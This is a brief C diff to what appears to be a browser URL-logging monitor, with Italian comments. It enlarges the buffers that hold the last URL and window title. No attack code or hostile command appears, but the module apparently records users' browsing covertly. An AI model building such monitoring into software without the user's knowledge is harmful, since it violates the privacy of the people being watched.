@@ -6,8 +6,8 @@
 #define MAXURLLEN 1024
 #define MAXURLTITLELEN 256
 BOOL bPM_UrlLogStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
-WCHAR last_url[MAXURLLEN+1];
-WCHAR last_window_title[MAXURLTITLELEN+1];
+WCHAR last_url[MAXURLLEN+2];
+WCHAR last_window_title[MAXURLTITLELEN+2];
 LPFNOBJECTFROMLRESULT pfObjectFromLresult = NULL;
 BOOL m_url_found = FALSE;
 #define URL_LOG_VER 0x20100713
